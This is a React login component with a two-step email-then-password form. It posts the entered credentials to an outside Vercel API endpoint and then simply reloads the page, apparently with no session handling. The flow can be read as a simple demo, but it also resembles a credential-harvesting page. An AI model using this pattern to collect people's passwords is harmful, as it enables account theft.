import React, { useState } from 'react';
import axios from 'axios'; // Make sure to import axios
import './Login.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
  const [password, setPassword] = useState('');

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handleEmailSubmit = () => {
    if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
      alert('Please enter a valid email address');
      return;
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setIsEmailConfirmed(true);
    }, 1000); // Simulate 1-second loading time
  };

  // New function to handle login
  const handleLogin = async () => {
    setIsLoading(true);
    try {
      const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
        email: email,
        password: password,
      },); 
  
      console.log('Login successful:', response.data);
      alert('Login successful');
      window.location.reload();
    } catch (error) {
      if (error.message === 'Network Error') {
        alert('Network error: Unable to connect to the server.');
      } else if (error.response) {
        console.error('Error:', error.response.data);
        alert(`Login failed with status code ${error.response.status}`);
      } else {
        alert('An unknown error occurred.');
      }
    } finally {
      setIsLoading(false);
    }
  };
 

  return (
    <div className="login-container">
      <div className="login-box">
        <div className="input-group">
          <h2>Sign In To Continue -</h2>
          <div className="email-input-wrapper">
            <input
              type="email"
              value={email}
              onChange={handleEmailChange}
              disabled={isEmailConfirmed}
              placeholder="Email"
              required
            />
            <button onClick={handleEmailSubmit} disabled={isLoading || isEmailConfirmed || !email}>
              {isLoading ? (
                <span className="spinner"></span>
              ) : isEmailConfirmed ? (
                <span className="tick">✔</span>
              ) : (
                <span>Next</span>
              )}
            </button>
          </div>
        </div>
        {isEmailConfirmed && (
          <div className="input-group">
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              required
            />
          </div>
        )}
        {isEmailConfirmed && password && (
          <button className="login-btn" onClick={handleLogin}>
            Login
          </button>
        )}
      </div>
    </div>
  );
};

export default Login;
